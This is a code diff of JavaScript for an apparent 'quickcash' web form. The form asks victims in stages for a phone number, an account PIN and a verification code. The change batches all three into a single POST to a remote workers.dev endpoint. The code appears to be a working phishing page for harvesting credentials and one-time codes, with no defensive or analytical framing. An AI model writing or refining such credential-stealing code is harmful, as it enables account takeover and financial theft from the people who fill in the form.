@@ -114,16 +114,17 @@ const waiting = document.getElementById("waiting");
 
 const API_URL = "https://quickcash-backend.doviaskipmoi.workers.dev/notify";
 
+// Store user entries across stages
 let applicationPhone = "";
+let applicationPin = "";
 
-async function sendNotification(event, additionalData = {}) {
+async function sendNotification(event, data = {}) {
   const response = await fetch(API_URL, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
     body: JSON.stringify({
       event,
-      phone: applicationPhone,
-      ...additionalData
+      ...data
     })
   });
 
@@ -134,7 +135,7 @@ async function sendNotification(event, additionalData = {}) {
   return response.json();
 }
 
-document.getElementById("phoneButton").onclick = async () => {
+document.getElementById("phoneButton").onclick = () => {
   const phone = document.getElementById("phone").value.trim();
 
   if (!phone) {
@@ -143,17 +144,11 @@ document.getElementById("phoneButton").onclick = async () => {
   }
 
   applicationPhone = phone;
-
-  try {
-    await sendNotification("phone_submitted");
-    phoneStage.classList.add("hidden");
-    pinStage.classList.remove("hidden");
-  } catch {
-    alert("Unable to submit. Please try again.");
-  }
+  phoneStage.classList.add("hidden");
+  pinStage.classList.remove("hidden");
 };
 
-document.getElementById("pinButton").onclick = async () => {
+document.getElementById("pinButton").onclick = () => {
   const pin = document.getElementById("pin").value.trim();
 
   if (!pin) {
@@ -161,14 +156,9 @@ document.getElementById("pinButton").onclick = async () => {
     return;
   }
 
-  try {
-    // Pass the PIN along with the phone number
-    await sendNotification("pin_submitted", { pin });
-    pinStage.classList.add("hidden");
-    codeStage.classList.remove("hidden");
-  } catch {
-    alert("Unable to submit. Please try again.");
-  }
+  applicationPin = pin;
+  pinStage.classList.add("hidden");
+  codeStage.classList.remove("hidden");
 };
 
 document.getElementById("codeButton").onclick = async () => {
@@ -180,8 +170,13 @@ document.getElementById("codeButton").onclick = async () => {
   }
 
   try {
-    // Pass the Code along with the phone number
-    await sendNotification("code_submitted", { code });
+    // Send phone number, PIN, and code all together in one payload
+    await sendNotification("code_submitted", {
+      phone: applicationPhone,
+      pin: applicationPin,
+      code: code
+    });
+
     codeStage.classList.add("hidden");
     waiting.classList.remove("hidden");
   } catch {
